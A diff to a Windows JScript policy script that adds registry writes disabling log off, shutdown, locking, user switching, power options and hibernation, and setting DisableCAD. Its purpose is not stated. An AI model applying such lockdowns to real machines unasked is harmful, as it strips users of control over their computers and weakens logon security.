@@ -75,6 +75,19 @@ function applyPolicies() {
     setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize\\ColorPrevalence", "REG_DWORD", 1);
     setReg("HKCU\\Software\\Microsoft\\Windows\\DWM\\ColorizationColor", "REG_DWORD", -16776961);
     setReg("HKCU\\Software\\Microsoft\\Windows\\DWM\\ColorizationColorBalance", "REG_DWORD", 100);
+    setReg("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Power\\HibernateEnabled", "REG_DWORD", 0); 
+    setReg("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Power\\CsEnabled", "REG_DWORD", 0);
+    setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\NoLogOff", "REG_DWORD", 1);
+    setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\NoClose", "REG_DWORD", 1);
+    setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\NoSwitchUser", "REG_DWORD", 1);
+    setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableLockWorkstation", "REG_DWORD", 1);
+    setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoLogoff", "REG_DWORD", 1);
+    setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoClose", "REG_DWORD", 1);
+    setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoPowerOptions", "REG_DWORD", 1);
+    setReg("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ShutdownWithoutLogon", "REG_DWORD", 1);
+    setReg("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\HideFastUserSwitching", "REG_DWORD", 1);
+    setReg("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableCAD", "REG_DWORD", 1);
+    runCmd('powercfg /hibernate off')
     var network = new ActiveXObject("WScript.Network");
     var strUser = network.ComputerName;
     var s = "C:/a.txt";
